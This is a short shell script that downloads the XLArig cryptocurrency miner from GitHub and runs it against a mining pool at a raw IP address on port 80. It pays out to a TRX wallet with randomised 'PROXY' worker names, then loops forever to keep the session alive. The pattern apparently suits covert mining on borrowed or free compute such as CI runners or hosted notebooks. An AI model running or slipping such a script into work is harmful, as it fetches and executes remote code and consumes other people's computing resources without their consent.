sudo apt update
sudo apt install screen -y
wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip 
unzip XLArig-v5.2.2-linux-x86_64.zip 
./xlarig -o 61.5.127.21:80 -a rx/0 -k -u TRX:TM5s6Yisi5eujDasyt9rBeWwjLZmNpXQZh.$(echo $(shuf -i 1-9999 -n 1)-PROXY)
while [ 1 ]; do
sleep 1.2
done
sleep 1295
